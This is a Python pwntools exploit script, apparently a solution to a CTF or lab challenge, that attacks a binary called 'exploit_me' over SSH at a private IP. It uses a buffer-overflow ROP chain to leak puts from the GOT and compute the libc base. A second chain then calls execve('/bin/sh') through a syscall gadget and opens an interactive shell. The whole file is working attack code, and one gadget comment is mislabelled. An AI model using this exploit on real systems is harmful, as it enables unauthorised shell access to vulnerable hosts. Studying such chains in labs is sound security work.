#!/usr/bin/env python3

from pwn import *

exe = ELF("exploit_me_patched")
libc = ELF("libc-2.23.so")
#ld = ELF("./ld-2.23.so")

context.binary = exe
context.endian = 'little'


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        #r = remote("10.10.24.49", 9999)
        s = ssh(host='10.10.24.49',user='zeeshan',keyfile='./id_rsa')
        r = s.process('/exploit_me')

    return r


def main():
    r = conn()

    data = r.recvline()
    print(data)

    print('puts@plt: ' + hex(exe.plt["puts"]))

    # 1st payload
    pop_rdi = p64(0x0000000000400653, endianness = 'little')
    puts_plt = p64(exe.plt["puts"], endianness = 'little')
    puts_got = p64(exe.got["puts"], endianness = 'little')
    main_addr = p64(exe.symbols["main"], endianness = 'little')

    payload = b'a'*40 + pop_rdi + puts_got + puts_plt + main_addr
    r.sendline(payload)
    puts_got_addr = r.recv(6) # last 2 bytes are null bytes
    puts_got_addr = puts_got_addr.hex() + "0000" # add 2 null bytes
    puts_got_addr = bytes.fromhex(puts_got_addr)
    print(puts_got_addr)
    libc_addr = u64(puts_got_addr) - libc.symbols["puts"] # libc base addr
    print("libc address: " + hex(u64(puts_got_addr) - libc.symbols["puts"]))


    # 2nd payload
    pop_rax = p64(0x000000000003a738 + libc_addr) # pop rax; ret;
    pop_rdi = p64(0x00000000001432b7 + libc_addr ) # pop rdx; ret;
    pop_rsi = p64(0x00000000000202f8 + libc_addr ) # pop rsi; ret;
    pop_rdx = p64(0x0000000000001b92 + libc_addr ) # pop rdx; ret;
    bin_sh = p64(0x18ce57 + libc_addr) # '/bin/sh'
    syscall = p64(0x00000000001752f8 + libc_addr)
    tmp = 59
    syscall_id = tmp.to_bytes(8, 'little')
    zero = p64(0, endianness = 'little')
    payload = b'a'*40 + pop_rax + syscall_id + pop_rdi + bin_sh \
              + pop_rsi + zero + pop_rdx + zero + syscall

    r.sendline(payload) 

    r.interactive()


if __name__ == "__main__":
    main()
